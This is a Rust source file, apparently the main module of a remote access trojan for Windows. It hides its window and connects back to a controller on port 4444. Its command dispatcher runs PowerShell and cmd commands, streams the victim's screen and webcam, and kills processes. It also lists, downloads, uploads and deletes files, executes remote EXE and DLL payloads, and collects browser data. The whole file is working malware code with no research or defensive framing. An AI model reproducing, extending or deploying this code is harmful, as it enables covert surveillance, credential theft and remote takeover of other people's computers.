
// Build:   cargo build --release

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod screen;
mod camera;
mod sysinfo;
mod shell;
mod tasks;
mod filebrowser;
mod rfe;
mod browser;

use std::{
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread,
    time::Duration,
};

const HOST: &str = "127.0.0.1";
const PORT: u16 = 4444;
const RECONNECT_DELAY: u64 = 5;

pub type Sock = Arc<Mutex<TcpStream>>;

fn send(sock: &Sock, msg: &str) {
    if let Ok(mut s) = sock.lock() {
        let _ = s.write_all(format!("{}\n", msg).as_bytes());
    }
}

fn main() {
    let sysinfo = sysinfo::collect();

    loop {
        match TcpStream::connect(format!("{}:{}", HOST, PORT)) {
            Err(_) => {
                thread::sleep(Duration::from_secs(RECONNECT_DELAY));
                continue;
            }
            Ok(stream) => {
                // Send sysinfo on connect
                {
                    let mut s = stream.try_clone().expect("clone failed");
                    let _ = s.write_all(format!("[sysinfo]{}\n", sysinfo).as_bytes());
                }

                let sock: Sock = Arc::new(Mutex::new(stream.try_clone().unwrap()));

                let screening = Arc::new(AtomicBool::new(false));
                let caming    = Arc::new(AtomicBool::new(false));

                let reader = BufReader::new(stream);
                let mut connection_ok = true;

                for line in reader.lines() {
                    match line {
                        Err(_) => { connection_ok = false; break; }
                        Ok(cmd) => {
                            let cmd = cmd.trim().to_string();
                            if cmd.is_empty() { continue; }

                            let sock2      = Arc::clone(&sock);
                            let screening2 = Arc::clone(&screening);
                            let caming2    = Arc::clone(&caming);

                            thread::spawn(move || {
                                handle_command(sock2, screening2, caming2, &cmd);
                            });
                        }
                    }
                }

                // Cleanup streams
                screening.store(false, Ordering::SeqCst);
                caming.store(false, Ordering::SeqCst);
                drop(sock);

                if !connection_ok {
                    thread::sleep(Duration::from_secs(RECONNECT_DELAY));
                }
            }
        }
    }
}

fn handle_command(
    sock: Sock,
    screening: Arc<AtomicBool>,
    caming: Arc<AtomicBool>,
    cmd: &str,
) {
    // ── ping ─────────────────────────────────────────────────
    if cmd == "ping" {
        send(&sock, "pong");
        return;
    }

    // ── [msg] ────────────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[msg] ") {
        let _ = rest; // server-side message, just ack
        send(&sock, "ok");
        return;
    }

    // ── [exec_ps] ────────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[exec_ps]") {
        let output = shell::run_powershell(rest.trim());
        for line in output.lines() {
            send(&sock, &format!("[ps_output]{}", line));
        }
        return;
    }

    // ── [exec_cmd] ───────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[exec_cmd]") {
        let output = shell::run_cmd(rest.trim());
        for line in output.lines() {
            send(&sock, &format!("[cmd_output]{}", line));
        }
        return;
    }

    // ── [screen_start] ───────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[screen_start]") {
        let fps: u32 = rest.trim().parse().unwrap_or(10);
        if !screening.load(Ordering::SeqCst) {
            screening.store(true, Ordering::SeqCst);
            let sock2  = Arc::clone(&sock);
            let flag   = Arc::clone(&screening);
            thread::spawn(move || screen::stream_loop(sock2, flag, fps));
        }
        return;
    }

    if cmd == "[screen_stop]" {
        screening.store(false, Ordering::SeqCst);
        return;
    }

    // ── [cam_start] ──────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[cam_start]") {
        let fps: u32 = rest.trim().parse().unwrap_or(10);
        if !caming.load(Ordering::SeqCst) {
            caming.store(true, Ordering::SeqCst);
            let sock2 = Arc::clone(&sock);
            let flag  = Arc::clone(&caming);
            thread::spawn(move || camera::stream_loop(sock2, flag, fps));
        }
        return;
    }

    if cmd == "[cam_stop]" {
        caming.store(false, Ordering::SeqCst);
        return;
    }

    // ── [tasklist] ───────────────────────────────────────────
    if cmd == "[tasklist]" {
        tasks::handle_tasklist(&sock);
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[taskkill]") {
        tasks::handle_taskkill(&sock, rest.trim());
        return;
    }

    // ── File Browser ─────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[ls]") {
        filebrowser::handle_ls(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[download]") {
        filebrowser::handle_download(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[delete]") {
        filebrowser::handle_delete(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[mkdir]") {
        filebrowser::handle_mkdir(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[upload]") {
        filebrowser::handle_upload(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[rename]") {
        filebrowser::handle_rename(&sock, rest.trim());
        return;
    }

    // ── Remote File Execution ────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[rfe_exe]") {
        rfe::handle_exe(&sock, rest.trim());
        return;
    }

    if let Some(rest) = cmd.strip_prefix("[rfe_dll]") {
        rfe::handle_dll(&sock, rest.trim());
        return;
    }

    // ── Browser Data ─────────────────────────────────────────
    if let Some(rest) = cmd.strip_prefix("[browser_collect]") {
        let browser_name = rest.trim().to_string();
        let sock_clone = Arc::clone(&sock);
        thread::spawn(move || {
            browser::collect_browser_data(&browser_name, &sock_clone);
        });
        return;
    }
}
